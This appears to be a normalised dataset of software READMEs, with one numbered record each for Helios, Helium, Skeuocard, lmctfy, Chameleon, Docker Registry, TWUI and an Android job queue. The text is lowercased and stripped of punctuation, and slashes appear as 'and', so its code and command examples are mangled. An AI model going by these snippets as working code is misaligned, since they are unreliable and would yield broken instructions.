9175924, helios is an open source framework that provides essential backend services for ios apps from data synchronization and user accounts to push notifications in app purchases and passbook integration it allows developers to get a client server app up and running in just a few minutes and seamlessly incorporate functionality as necessary helios is designed for mobile first development build out great features on the device and implement the server side components as necessary pour all of your energy into crafting a great user experience rather than getting mired down with the backend one great example of this philosophy in helios is core data synchronization this allows you to use your existing core data model definition to automatically generate a rest webservice which can be used to shuttle data between the server and client no icloud no problem helios also comes with a web ui browse and search through all of your database records push notification registrations in app purchases and passbook passes you can even send targeted push notifications right from the browser  verify ruby installation ruby v  install helios bundler and at the command prompt gem install helios  create a new helios application helios new myapp  create a postgres database at the command prompt createdb h localhost myapp database credentials are read from the env file generated by helios as the variable databaseurl by default this will point to a database with the name of the generated app  change directory to myapp cd myapp  start the web server helios server read on for instructions on the following linking a core data model integrating helios into your mobile client built on the rack webserver interface helios can be easily added into any existing rails or sinatra application as middleware or if you re starting with a helios application you can build a new rails or sinatra application on top of it this means that you can develop your application using the tools and frameworks you love and maintain flexibility with your architecture as your needs evolve gem helios require bundler bundler require run helios application new do service data model path and to and

helios help a command line interface for building mobile infrastructures commands console open irb session with helios environment help display global or command help documentation link links a core data model new creates a new helios project server start running helios locally the first step to using helios is to create a new application this can be done with the helios new command which should be familiar if you ve ever used rails helios new help usage helios new path and to and app the helios new command creates a new helios application with a default directory structure and configuration at the path you specify skip gemfile don t create a gemfile b skip bundle don t run bundle install g skip git don t create a git repository edge setup the application with gemfile pointing to helios repository f force overwrite files that already exist p pretend run but do not make any changes s skip skip files that already exist in order to keep your data model and rest webservices in sync you can link it to your helios application helios link path and to and datamodel xcdatamodel this creates a hard link between the data model file in your xcode and helios projects any changes made to either file will affect both the next time you start the server helios will automatically migrate the database to create tables and insert columns to accomodate any new entities or attributes if you are using os x do not attempt to delete your helios application directory using rm r if you have linked a core data model doing so will result in the removal of the xcode data model itself instead use the finder to move the helios application directory to trash to run helios in development mode on localhost  run the server command helios server once you have registered a device and set up your certificate try this in order to set up storage for newsstand you will need an account with one of the following cloud storage providers in your application directory edit the config ru with your

472860, helium is a tool for discovering unused css across many pages on a web site the tool is javascript based and runs from the browser helium accepts a list of urls for different sections of a site then loads and parses each page to build up a list of all stylesheets it then visits each page in the url list and checks if the selectors found in the stylesheets are used on the pages finally it generates a report that details each stylesheet and the selectors that were not found to be used on any of the given pages  add a script element somewhere on your site that is loaded into every page that will be tested this is typically a header or footer section the element looks like note path and to and helium js needs to reflect the path of where you place the javascript file  helium is initiated by calling the method helium init this has to be placed somewhere on the page where it gets called after page load an example of this is script type text and javascript window addeventlistener load  function helium init  false and script note depending on the javascript loading strategy your site employs you may wish to place helium init within a location that executes javascript after page load  once helium is setup when you load your site you will see a box with a textarea where you input your url list  after you paste your list of links click start lower left to begin the process clicking reset to beginning clears the textarea and stored data  the test will proceed to load and process each url you gave when it is finished you are presented with a report window that lists each stylesheet url that was detected under each stylesheet it will list the css selectors that were not detected to be in use on any page  the selectors are color coded green unmatched selectors these are the primary ones that were not detected as in use black matched selectors that are grouped with non matched selectors basically this means that multiple selectors were defined together like hhh all selectors are tested individually so these are displayed to make them easier to find in the stylesheets later red malformed selectors these are likely to be rare this means that when the browser tried testing for a selector it can t parse the syntax of how it was written this could be like classname idname or a css hack often used for internet explorer blue pseudo class selector these are selectors like div hover or input focus these are selectors that require user interaction to activate currently helium can t simulate the interactions required to see if these are found or not it is the developer s responsibility to test for these manually any modern browser that supports localstorage and document queryselector i have decided i will never adapt helium to support ie or   no cross domain stylesheets helium has to load the stylesheets on your site via xhr in order to parse out the selectors to test this means that all stylesheets urls have to be on the same domain as the pages being tested there s currently no back end server to proxy requests but this might be an option in the future  no javascript errors on your pages if helium is run on a page that has one or more javascript errors it can easily prevent helium and other scripts from running on the page this will stop your tests dead in their tracks verify ahead of time that all of the urls you are testing do not generate any javascript errors if you aren t sure try running some helium tests and see what page it stops at check out your error consoles on such pages  no sitemap xml support right now the url list has to be line separated no csv or sitemap xml format is currently supported though it will be in a future release helium doesn t have actual unit tests yet i ve been meaning to add them for a while years and will soon for a very simple server example using ruby because its on most systems ruby run e httpd p

11745592, unfortunately i haven t been able to find the time that i would like to dedicate to this project although it is still widely stable on most browsers the internet is an inherently unstable place and the usability of skeuocard will deteriorate over time if not maintained and improved to further the use of skeuocard i m looking for a new maintainer for the skeuocard project to those of you that have submitted issues and pull requests thank you so much for your time attention to detail and effort i m sorry that i haven t been able to return that this was always meant to be at worst an experiment and at best a gift i hope you enjoy skeuocard and i hope that we find a maintainer who can give this the attention your interest has demonstrated that it deserves if you believe yourself or someone you know to be qualified please reach out to me via email ken and skeuocard kenkeiter com mailto ken and skeuocard kenkeiter com skeuocard is a re think of the way we handle credit card input on the web it progressively enhances credit card input forms so that the card inputs become skeuomorphic facilitating accurate and fast card entry and removing barriers to purchase skeuocard takes a standard credit card input form and partially transforms its dom removing non essential elements while leaving the underlying inputs alone in order to use skeuocard in your checkout page you ll need to do one of two things bower install skeuocard or you can link the necessary style sheets and scripts and make sure any asset dependencies are at the right paths link rel stylesheet href styles and demo css side note if you d like to use different input name s or selectors you can specify those at instantiation see the changing underlying value selectors section below either you have javascript disabled or you re using an unsupported browser amigo that s why you re seeing this old school credit card input form instead of a fancy new skeuocard on the other hand at least you know it gracefully degrades label for cctype card type and label select name cctype option value and option option value visa visa and option option value discover discover and option option value mastercard mastercard and option option value maestro maestro and option option value jcb jcb and option option value unionpay china unionpay and option option value amex american express and option option value dinersclubintl diners club and option and select label for ccnumber card number and label input type text name ccnumber id ccnumber placeholder xxxx xxxx xxxx xxxx maxlength  size  label for ccexpmonth expiration month and label input type text name ccexpmonth id ccexpmonth placeholder  label for ccexpyear expiration year and label input type text name ccexpyear id ccexpyear placeholder  label for ccname cardholder s name and label input type text name ccname id ccname placeholder john doe label for cccvc card validation code and label input type text name cccvc id cccvc placeholder  maxlength  size  when the skeuocard is instantiated for the containing element above all children of the containing element will be removed except for the underlying form fields causing a skeuocard to appear instead is as simple as javascript document ready function card new skeuocard skeuocard that s it you ve got a skeuomorphic credit card input instead of your normal confusing form skeuocard occasionally provides useful debugging output by instantiating skeuocard with the debug option set to true those messages will be sent to console log and prefixed with skeuocard javascript new skeuocard skeuocard  debug true by default when skeuocard is initialized the input field will be focused if you don t want this to happen for example if the skeuocard element is positioned below the fold and you want to prevent the browser from scrolling there  then pass dontfocus true as an initialization option javascript new skeuocard skeuocard  dontfocus true sometimes you ll need to pre fill credit card information when you load the page to do so you can simply provide a value attribute for your form fields or option selected  in the case of a select  and skeuocard will pick up your initial values when instantiated alternately you can instantiate your skeuocard instance with an initialvalues object which will override any existing values provided in the form like so javascript new skeuocard skeuocard  initialvalues number   expmonth   expyear   name james doe  cvc  you can also change skeuocard values manually by changing the underlying form element s value and triggering a change event javascript name ccnumber val  trigger change you can change the character which skeuocard uses as a placeholder for segmented card inputs as well as the placeholder on the generic card view visible when a card type has not been determined by providing either of the following options at instantiation cardnumberplaceholderchar and genericplaceholder cardnumberplaceholderchar is used for filling only segmented inputs i e xxxx xxxx xxxx xxxx and is by default set to x the genericplaceholder value is used when the card type has not yet been determined and is by default set to xxxx xxxx xxxx xxxx javascript new skeuocard skeuocard  cardnumberplaceholderchar  genericplaceholder when a skeuocard is instantiated it attaches itself to a container element and removes any unneeded children before adding its own however skeuocard stores its values in pre existing input fields which aren t selected for removal by default skeuocard sets the following default selectors to match the underlying form fields within the container element and use them to store values typeinputselector name cctype numberinputselector name ccnumber expmonthinputselector name ccexpmonth expyearinputselector name ccexpyear nameinputselector name ccname cvcinputselector name cccvc providing any of those options with different values at instantiation will cause skeuocard to use your supplied selector instead for example if our credit card number field had a name of creditcardnumber instead of the default ccnumber  we could change it at instantiation like so javascript new skeuocard skeuocard  numberinputselector name creditcardnumber if you re smart you probably won t want to use the client s local date to validate against when checking expiration you can specify a date to check against at instantiation by setting currentdate on the skeuocard class like so javascript skeuocard currentdate new date year month day note that month is an integer from   by default skeuocard will automatically use the client s local date only accept visa and amex no worries skeuocard has you covered you can specify accepted card types with an options argument or in the underlying form itself to limit your accepted card products simply add or remove option s from your type select where either the value attribute matches the shortname of the product see the example below  or the data sc type attribute is set to the shortname of the product if your value needs to be different for legacy purposes select name cctype option value and option option value visa visa and option option value mastercard mastercard and option option value maestro maestro and option option value amex american express and option option value diners data sc type dinersclubintl diners club and option and select you can also optionally override this list by providing an array of accepted card product shortnames at instantiation like so javascript new skeuocard skeuocard  acceptedcardproducts visa  amex if you are using jquery s noconflict mode you ll need to instantiate your skeuocard instance slightly differently than above javascript jquery document ready function card new skeuocard jquery skeuocard progressive enhancement was really important to me when creating this plugin i wanted to make sure that a potential purchase opportunity would never be denied by a failure in skeuocard so i chose to take an approach which would leave the users with a functional styled form in the event that skeuocard fails you can style your un enhanced form elements in whichever way you wish when skeuocard is instantiated it will automatically add both the skeuocard and js classes to the container which will match the selectors necessary to style the card input properly at some point or another you re going to want your user to submit your purchase form so how do you determine if the credit card input they provided is valid while there are several ways of doing this there s one recommended way javascript card isvalid and and boolean sometimes you ll want to indicate a problem with the card to the user at instantiation for example if the card number after having been submitted to your payment processor is determined to be incorrect you can do this one of two ways by adding the invalid class to your underlying number form field at instantiation or by passing an initial validationstate argument with your options applying the invalid class to the invalid field input type text name ccnumber id ccnumber placeholder xxxx xxxx xxxx xxxx maxlength  size  class invalid providing a list of invalid fields at instantiation javascript new skeuocard skeuocard  validationstate number false exp true name true cvc true note that if the cvc is on the back of the card for the matching card product the card will automatically flip to show the invalid field you may wish to add a custom layout to support a card bin specific to your locale or for promotional reasons you can do so easily you ll need to create a set of transparent png file containing any elements you wish to appear on the card faces for an example see any of the images in the images and products and folder if you have adobe fireworks installed the editable images are also included in images and src and for an example of how to style a card see styles and cards scss once you have created your images and the appropriate css styling you will need to create a new cardproduct or variation of an existing card product lets say that we re matching a new type of gift card with a bin  that doesn t match any of the pre defined credit card providers javascript and and create a new cardproduct instance and register it with skeuocard skeuocard cardproduct create pattern and  and  and and match all cards starting with  companyname fancy gift card inc  companyshortname fancycard  and and this will be the card type cardnumbergrouping   and and how the number input should group cardnumberlength   and and array of valid card number lengths expirationformat mm and yy  and and format of the date field cvclength  and and the length of the cvc validateluhn true and and validate using the luhn algorithm layout number front  exp front  name front  cvc back now lets say that we d like to recognize and apply a layout for a visa card with a specific bin first we d select the matching card product and then add a variant which will extend it javascript and and find the existing visa product var visaproduct skeuocard cardproduct firstmatchingshortname visa and and register a new variation of the visa product visaproduct createvariation pattern and  and  issuingauthority chase  issuername chase sapphire card  issuershortname chase sapphire  layout number front  exp front  name front  cvc front you might not like the way skeuocard looks that s easy to fix css is used to style and position most elements in skeuocard with the exception of the card faces skeuocard aims to gain better compatibility with older browsers but for the time being it looks good and works well in the following browsers chrome mac win safari mac firefox  mac win mobile safari ios mobile chrome ios and android ie  and win it s recommended that you selectively disable skeuocard based upon browser version to retain maximum compatibility if you have an odd or obscure browser and wish to submit a patch that s always appreciated contributing to skeuocard is pretty simple simply fork the project make your changes in a branch and submit a pull request i ll do my best to keep an eye out for pull requests and triage any submitted issues please note that you must make changes on the src coffee scss files compile the changes with grunt and include any compiled changes in any pull requests you submit ensure that you have the following tools installed before continuing to begin working on skeuocard fork the repository to your github account and clone it to your machine once you have cd ed to your cloned skeuocard repository you ll need to install the required node packages npm install once that s completed simply run grunt upon starting grunt  the following things will happen a development server will be started on      index html will be opened automatically in your browser grunt will begin watching for changes to source files and setup live reload source files will be recompiled automatically when changes are made simply make your changes to the necessary source files typically under the src directory of each directory in the project  commit the changes including the compiled changes  and submit a pull request i ve done my best to include layouts for all major card products visa mastercard amex etc in the project it is entirely possible that i ve missed some products and that the addition of a product is justified however i m not accepting issuer specific layouts for things like visa branded products at this time there are literally thousands of them and doing so could be seen as discriminatory for the time being the only reason i ll make an exception is for cards like the chase sapphire which is a visa product but has been granted an allowance by visa to drastically alter the appearance and field layout of the card all of that said i m working on a standardized method of distributing issuer specific layouts for users who wish to cater to popular cards in their locale etc the trademarks and branding assets of the credit card products used in this project have not been used with express consent of their owners this project is intended for use only by those whom have the proper authorization to do so the trademarks and branding included in this project are property of their respective owners any complaints should be sent to me at ken and skeuocard complaints kenkeiter com and i will address them promptly i owe a special thanks to my guinea pig users and to the designers i met in coffee shops who took the time to critique this work

delegated to be managed by other user agents lmctfy was designed and implemented with specific use cases and configurations in mind and may not work out of the box for all use cases and configurations we do aim to support more use cases and configurations so please feel free to contribute contributing patches or send e mail to the mailing list mailing list so that we may incorporate these into the roadmap roadmap lmctfy is released as both a c and and library and a cli lmctfy is currently stalled as we migrate the core concepts to libcontainer and build a standard container management library that can be used by many projects lmctfy is beta software and may change as it evolves the latest release version is    it currently provides isolation for cpu memory and devices it also allows for the creation of virtual hosts which are more heavily isolated containers giving the impression of running as an independent host this section describes building the cli running all unit tests and initializing the machine the cli commands cli commands section provides some examples of cli operations and c and and library c library describes the use of the underlying library lmctfy depends on the following libraries and expects them to be available on the system glibc version   addtionally to build lmctfy you also need go compiler g and and or clang version with c and and  support tested with g and and   and clang   we ve tested the setup on ubuntu   and we are happy to accept patches that add support for other setups to build the lmctfy cli make j number of threads lmctfy the cli should now be available at bin and lmctfy and cli and lmctfy to build the lmctfy library make j number of threads liblmctfy a the library should now be available at bin and liblmctfy a to build and run all unit tests make j number of threads check in order to run lmctfy we must first initialize the machine this only needs to happen once and is typically done when the machine first boots if the cgroup hierarchies are already mounted then an empty config is enough and lmctfy will auto detect the existing mounts lmctfy init if the cgroup hierarchies are not mounted those must be specified so that lmctfy can mount them the current version of lmctfy needs the following cgroup hierarchies cpu  cpuset  cpuacct  memory  and freezer cpu and cpuacct are the only hierarchies that can be co mounted all other must be mounted individually for details on configuration specifications take a look at initspec in lmctfy proto and include and lmctfy proto an example configuration mounting all of the hierarchies in and sys and fs and cgroup lmctfy init cgroupmount mountpath and sys and fs and cgroup and cpu hierarchy cgroupcpu hierarchy cgroupcpuacct cgroupmount mountpath and sys and fs and

cgroupmemory the machine should now be ready to use lmctfy for container operations container names mimic filesystem paths closely since they express a hierarchy of containers i e containers can be inside other containers these are called subcontainers or child containers allowable characters for container names are alpha numeric a za z  and underscores  dashes periods an absolute path is one that is defined from the root and container i e and sys and subcont container names can also be relative i e subcont in general and unless otherwise specified regular filesystem path rules apply and root container and sys the sys top level container and sys and sub the sub container inside the sys top level container the current container and the current container the parent of the current container sub the sub subcontainer child container of the current container and sub the sub subcontainer child container of the current container and sub the sub top level container and sibling the sibling child container of the parent container to create a container run lmctfy create name specification please see lmctfy proto and include and lmctfy proto for the full containerspec example create a memory only container with mb limit lmctfy create memoryonly memory limit  to destroy a container run lmctfy destroy name to list all containers in a machine ask to recursively list from root lmctfy list containers r and you can also list only the current subcontainers lmctfy list containers to run a command inside a container run lmctfy run name command examples lmctfy run test echo hello world lmctfy run and test and sub bash lmctfy run n and test echo hello from a daemon use lmctfy help to see the full command listing and documentation the library is comprised of the containers lmctfy containerapi factory which creates gets destroys and detects containers lmctfy container objects that can be used to interact with individual containers full documentation for the lmctfy c and and library can be found in lmctfy h and include and lmctfy h the lmctfy project proposes a containers stack with two major layers we ll call cl and cl cl encompases the driver and enforcement of the containers policy set by cl cl will create and maintain the container abstraction for higher layers it should be the only layer that directly interacts with the kernel to manage containers cl is what develops and sets container policy it uses cl to enforce the policy and manage containers for example cl a daemon implements a policy that the amount of cpu and memory used by all of a machine s containers must not exceed the amount of available cpu and memory as opposed to overcommitting memory in the machine to enforce that policy it uses cl library and cli to create containers with memory limits that add up to the machine s available memory alternate policies may involve overcommitting a machine s resources by x or creating levels of resources with different guarantees for quality of service the lmctfy project currently provides the cl component the cl is not yet implemented currently only provides robust cpu and memory isolation in our roadmap we have support for the following disk io isolation the specification is mostly complete we re missing the controller and resource handler network isolation the specification and cgroup implementation is up in the air support for root file systems specifying and building root file systems disk images being able to import and export a container s root file system image checkpoint restore being able to checkpoint and restore containers on different machines the most basic cl would use a container policy that ensures the fair sharing of a machine s resources without allowing overcommitment we aim to eventually implement a cl that provides different levels of guaranteed quality of service in this scheme some levels are given stronger quality of service than others the following cl features are supported in our roadmap monitoring and statistics support admission control and feasibility checks quality of service guarantees and enforcement lmctfy was originally designed and implemented around a custom kernel with a set of patches on top of a vanilla linux kernel as such some features work best in conjunction with those kernel patches however lmctfy should work without them it should detect available kernel support and adapt accordingly we ve tested lmctfy in vanilla ubuntu   and   kernels please report any issues you find with other kernel versions some of the relevant kernel patches cpu latency this adds the cpu lat cgroup file to the cpu hierarchy it bounds the cpu wakeup latency a cgroup can expect cpu histogram accounting this adds the cpuacct histogram cgroup file to the cpuacct hierarchy it provides various histograms of cpu scheduling behavior oom management series of patches to enforce priorities during out of memory conditions interested in contributing to the project feel free to send a patch or take a look at our roadmap roadmap for ideas on areas of contribution follow getting started getting started above and it should get you up and running if not let us know so we can help and improve the instructions there is some documentation on the structure of lmctfy in the primer and primer md
1507264, chameleon is a port of apple s uikit and some minimal related frameworks to mac os x it is meant to be as much of a drop in replacement for the real uikit as possible it also adapts some ios user interface conventions to the mac such as uialertview being represented by nsalert so that apps built using chameleon have as much chance as possible of feeling at home on the desktop with relatively little porting effort the uikit implementation mostly targets ios   s version of uikit not everything is implemented at this time but a surprisingly large subset is there are some methods and and or behaviors from later versions of ios implemented as well any uikit methods that were deprecated around ios   are not included as a general rule if apple s uikit behaves in a certain way for some piece of code that behavior should be considered correct even if you don t like how apple s version does things if chameleon s behavior differs chameleon is wrong that said before immediately blaming problems on chameleon be absolutely sure that your code is in fact behaving differently than it would on apple s implementation also be certain that there isn t a good reason chameleon s behavior may differ an example of a difference that is intended is the behavior of uialertview in apple s uikit it is a uiview and has certain expected behaviors and capabilities as a result in chameleon it is still a uiview but it is presented as an nsalert and that is simply how it should be to achieve a more native feel but it also means any uiview tricks that may have worked with a uialertview on ios will not work the same under chameleon uiactionsheet and uitextview are other examples of areas that have sometimes large but intentional differences chameleon is actually a collection of several frameworks the largest of which is uikit the others are mostly stubs that made porting simple demos and test apps from ios very simple with minimal in some cases zero code changes and may or may not be necessary for you the xcode projects build embeddable frameworks which can then be bundled within your own app s bundle and distributed in a self contained way the uikit port in chameleon starts at a very low level and attempts to go so far as to even route uievent objects along a similar path starting in the single uiapplication instance and getting routed from there to the correct uiwindows and uiviews the interface between appkit s nsviews and nswindows and chameleon s uiwindow and uiviews occurs at the screen level uikitview is an nsview which you add to your nsview hierarchy in whatever way you want the uikitview hosts a uiscreen instance which is home to uikit s interface elements each uiwindow belongs to a uiscreen and uiviews must exist on uiwindows this should mostly work the same as you ve come to expect on ios an important thing to note is that mac applications often have more than one window if you use more than one uikitview in your app be aware that this means your application now has more than one uiscreen and as a result some methods such as uiscreen mainscreen may suddenly do unexpected things when porting twitterrific from ios this was one source of unexpected bugs as a few things were making assumptions about there only being a single main screen since that is normal on current ios devices once a uikitview exists and there s a uiscreen available to work with your code can proceed to build a uiwindow and uiviews on top of it and be largely unaware that it is actually running on osx instead of ios for those cases where you need to customize some ui uiuserinterfaceidiomdesktop has been added so that your code can differentiate between running on a pad phone or desktop in a consistent way to keep code cross platform the following is a good way to structure things so that apple s uikit doesn t encounter the unknown uiuserinterfaceidiomdesktop symbol when compiling for ios if uiuserinterfaceidiom uiuserinterfaceidiomphone and and iphone else if uiuserinterfaceidiom uiuserinterfaceidiompad else you can always use ifdef or other compile time approaches for platform differentiation too especially since a mac app built with chameleon doesn t need to adapt to multiple ui idioms at runtime the way a universal ios app does i just find it nice to have a similar pattern for all  idioms but maybe that s just me you can usually just create an instance of your ios app s uiapplicationdelegate object and then pass it into uikitview s helper method launchapplicationwithdelegate afterdelay which will emulate the startup process of an ios app it will even attempt to show a default png if a delay is given you might perform this step in your nsapplicationdelegate object s applicationdidfinishlaunching method it is not necessary to use uikitview s helper method to launch your app but it can be a good way to get started generally the interfaces to the classes are the same as apple s documented interfaces some objects have additional methods that are useful for os x and are defined in classname appkitintegration h headers which are not included by the standard uikit h header to easily include all appkit extensions into your code import uikit and appkitintegration h when compiling on os x there are also a couple of non standard ui classes defined such as uikey and uiviewadapter that i designed out of necessity keyboard handling in particular is a weak spot of apple s current uikit and so i developed my own rough api in place of anything official being documented by apple right now there s hardly any demos or examples or documentation there s a simple app called bigapple in the examples folder which might be enough to get started it also shows how the uikit xcode project can be referenced from another xcode project and setup as a dependency so that it is built automatically when the bigapple project is built copyright c  the iconfactory all

9461481,  docker registry  about this document  as the documentation evolves with different registry versions be sure that before reading any further you check which version of the registry you are running switch to the corresponding tag to access the readme that matches your product version please also have a quick look at the faq faq md before reporting bugs the fastest way to get running run the registry docker run p   registry here is a slightly more complex example that launches a registry on port  using an amazon s bucket to store images with a custom path and enables the search endpoint docker run e settingsflavor s e awsbucket mybucket e storagepath and registry e awskey myawskey e awssecret myawssecret e searchbackend sqlalchemy p   registry by default the registry will use the configsample yml config and configsample yml configuration to start individual configuration options from that file may be overridden using environment variables example docker run e storagepath and registry you may also use different flavors from that file see below finally you can use your own configuration file see below the registry can be instructed to use a specific flavor from a configuration file this mechanism lets you define different running mode eg development  production or anything else in the configsample yml file you ll see several sample flavors  common used by all other flavors as base settings  local stores data on the local filesystem  s stores data in an aws s bucket  ceph s stores data in a ceph cluster via a ceph object gateway using the s api  azureblob stores data in an microsoft azure blob storage docs advanced md  dev basic configuration using the local flavor  test used by unit tests  prod production configuration basically a synonym for the s flavor  gcs stores data in google cloud storage  swift stores data in openstack swift  glance stores data in openstack glance with a fallback to local storage  glance swift stores data in openstack glance with a fallback to swift  elliptics stores data in elliptics key and value storage you can define your own flavors by adding a new top level yaml key to specify which flavor you want to run set the settingsflavor environment variable export settingsflavor dev the default flavor is dev note it s possible to load environment variables from within the config file with a simple syntax env variablename default check this syntax in action in the example below common common standalone true loglevel info searchbackend env searchbackend sqlalchemyindexdatabase env

that log in it defaults to  disabletokenauth boolean disable checking of tokens with the docker index you should provide your own method of authentication such as basic auth the docker registry can optionally index repository information in a database for the get and v and search endpoint search endpoint you can configure the backend with a configuration like the searchbackend setting selects the search backend to use if searchbackend is empty no index is built and the search endpoint always returns empty results  searchbackend the name of the search backend engine to use currently supported backends are  sqlalchemy if searchbackend is neither empty nor one of the supported backends it should point to a module searchbackend foo registry index xapian in this case the module is imported and an instance of its index class is used as the search backend use sqlalchemy as the search backend  sqlalchemyindexdatabase the database url passed through to createengine searchbackend sqlalchemy sqlalchemyindexdatabase sqlite and and and and tmp and docker registry db on initialization the sqlalchemyindex class checks the database version if the database doesn t exist yet or does

this case you need shows an example to enable the lru cache using the config directive cachelru once this feature is enabled all small files tags meta data will be cached in redis when using a remote storage backend like amazon s  it will speed things up dramatically since it will reduce roundtrips to s all config settings are placed in a cache or cachelru section  cache and cachelru  host host

1984691, twui is a hardware accelerated ui framework for mac inspired by uikit it enables gpu accelerated rendering backed by coreanimation simple model and view and controller development familiar to ios developers it differs from uikit in a few ways simplified table view cells block based layout and drawrect a consistent coordinate system bottom left origin sub pixel text rendering to use the current development version include all the files in your project and import tuikit h set your target to link to the applicationservices and quartzcore frameworks be sure to add nsbuildlike to your preprocessor flags your tuiview based view hierarchy is hosted inside an tuinsview which is the bridge between appkit and twui you may set a tuinsview as the content view of your window if you d like to build your whole ui with twui or you may opt to have a few smaller tuinsviews using twui just where it makes sense and continue to use appkit everywhere else an included example project shows off the basic construction of a pure twui based app a tuinsview is added as the content view of the window and some tuiview based views are hosted in that it includes a table view and a tab bar which is a good example of how you might build your own custom controls twui should be considered an alpha project it is current shipping in twitter for mac in use  and  by many many users and has proven itself very stable the code still has a few twitter for mac isms that should be refactored and cleaned up the goal of twui is to build a high quality ui framework designed specifically for the mac much inspiration comes from uikit but diverging to try new things i e block based layout and drawrect  and to optimize for mac specific interactions is encouraged there are many places where twui could be improved accessibility it would be great to bridge the appkit accessibility apis to something simpler again inspired by uikit text editing tuitexteditor is a simple text editor built on tuitextrenderer it provides basic editing support and handles a number of standard keybindings fleshing this out to be indistinguishable from nstextview read spellchecking autocorrect would be useful if the logic around this were self contained it would even be great as a standalone project useful for anyone looking to build a custom text editor for the mac reverse hosting right now tuiviews may be hosted inside of an existing nsview hierarchy it would be useful if the reverse were possible adding nsviews inside of tuiviews doing so in a robust way so event routing the responder chain and caanimations all just work is a challenge cd docs doxygen twui has a mailing list subscribe by sending an email to twui librelist com copyright  twitter inc licensed under the apache license version   the license you may not use this work except in compliance with the license you may obtain a copy of the license in the license file or at unless required by applicable law or agreed to in writing software distributed under the license is distributed on an as is basis without warranties or conditions of any kind either express or implied see the license for the specific language governing permissions and limitations under the license

9316799,  android priority job queue job manager  it is written primarily with flexibility  functionality  in mind this is an ongoing project which we will continue to add stability and performance improvements almost every application does work in a background thread these background tasks are expected to keep the application responsive and robust especially during unfavorable situations e g limited network connectivity in android applications there are several ways to implement background work async task using an async task is the simplest approach but it is tightly coupled with the activity lifecycle if the activity dies or is re created  any ongoing async task will become wasted cycles or otherwise create unexpected behavior upon returning to the main thread in addition it is a terrible idea to drop a response from a network request just because a user rotated his and her phone loaders loaders are a better option as they recover themselves after a configuration change on the other hand they are designed to load data from disk and are not well suited for long running network requests service with a thread pool using a service is a much better solution as it de couples business logic from your ui however you will need a thread pool e g threadpoolexecutor to process requests in parallel broadcast events to update the ui and write additional code to persist queued requests to disk as your application grows the number of background operations grows which force you to consider task prioritization and often complicated concurrency problems job queue provides you a nice framework to do all of the above and more you define your background tasks as jobs  and enqueue them to your jobmanager  instance job manager will take care of prioritization persistence load balancing delaying network control grouping etc it also provides a nice lifecycle for your jobs to provide a better consistent user experience although not required it is most useful when used with an event bus it also supports dependency injection job queue was inspired by a google i and o  talk on rest client applications  since a code example is worth thousands of documentation pages here it is and and a job to send a tweet public class posttweetjob extends job public static final int priority  private string text public posttweetjob string text and and this job requires network connectivity and and and should be persisted in case the application exits before job is completed super new params priority requirenetwork persist override public void onadded and and job has been saved to disk and and this is a good place to dispatch a ui event to indicate the job will eventually run and and in this example it would be good to update the ui with the newly posted tweet override public void onrun throws throwable and and job logic goes here in this example the network call to post to twitter is done here webservice posttweet text override protected boolean shouldrerunonthrowable throwable throwable and and an error occurred in onrun and and return value determines whether this job should retry running true or abort false override protected void oncancel and and job has exceeded retry attempts or shouldrerunonthrowable has returned false public void onsendclick final string status edittext gettext tostring if status trim length  jobmanager addjobinbackground new posttweetjob status edittext settext that s it job manager allows you to enjoy no network calls in activity bound async tasks no serialization mess for important requests no manual implementation of network connectivity checks or retry logic when user clicked the send button onsendclick was called which creates a posttweetjob and adds it to job queue for execution it runs on a background thread because job queue will make a disk access to persist the job at posttweetjob onadded callback we saved posttweetjob to disk since there has been no network access up to this point the time between clicking the send button and reaching onadded is within fracions of a second this allows the implementation of onadded to inform ui to display the newly sent tweet almost instantly creating a fast user experience beware onadded is called on the thread job was added when it s time for posttweetjob to run job queue will call onrun and it will only be called if there is an active network connection as dictated at the job s constructor by default job queue uses a simple connection utility that checks connectivitymanager ensure you have accessnetworkstate permission in your manifest you can provide a custom implementation  which can add additional checks e g your server stability you should also provide a networkutil  which can notify job queue when network is recovered so that job queue will avoid a busy loop and decrease of consumers default configuration does it for you job queue will keep calling onrun until it succeeds or reaches a retry limit if onrun throws an exception job queue will call shouldrerunonthrowable to allow you to handle the exception and decide whether to retry job execution or abort if all retry attempts fail or when shouldrerunonthrowable returns false  job queue will call oncancel to allow you to clean your database inform the user etc it is very easy to de couple application logic from your activites making your code more robust easy to refactor and easy to test you don t have to deal with asynctask lifecycles this is true assuming you use an event bus to update your ui you should job queue takes care of prioritizing jobs checking network connection running them in parallel etc job prioritization is especially indispensable when you have a resource heavy app like ours you can delay jobs this is helpful in cases like sending a gcm token to your server it is very common to acquire a gcm token and send it to your server when a user logs in to your app but you don t want it to interfere with critical network operations e g fetching user facing content you can group jobs to ensure their serial execution if necessary for example assume you have a messaging client and your user sent a bunch of messages when their phone had no network coverage when creating these sendmessagetonetwork jobs you can group them by conversation id through this approach messages in the same conversation will send in the order they were enqueued while messages between different conversations are still sent in parallel this lets you effortlessly maximize network utilization and ensure data integrity by default job queue monitors network connectivity so you don t need to worry about it when a device is operating offline jobs that require the network won t run until connectivity is restored you can even provide a custom networkutil  if you need custom logic e g you can create another instance of job queue which runs only if there is a wireless connection it is unit tested and mostly documented you can check our code coverage report  and javadoc  we distribute artifacts through maven central repository gradle compile com path android priority jobqueue    dependency groupid com path and groupid version    and version and dependency you can also download  library jar sources and javadoc from maven central we highly recommend checking how you can configure job manager and individual jobs configure job manager  configure individual jobs  review sample app  review sample configuration     feb   report exceptions to logger if addinbackground fails     feb   fixed an important bug  where jobs in the same group may run in parallel if many of them become available at the same time while multiple consumer threads are waiting for a new job   jan   job status query api  fixed a stackoverflow bug when network status changes after a long time    jan   added parameterized  constructor for job for more readable code deprecated basejob in favor of a more complete job class    dec   first public release job queue does not depend on any other libraries other than android sdk for testing we use for code coverage report we use sample twitter client uses we are in the process of moving build system from

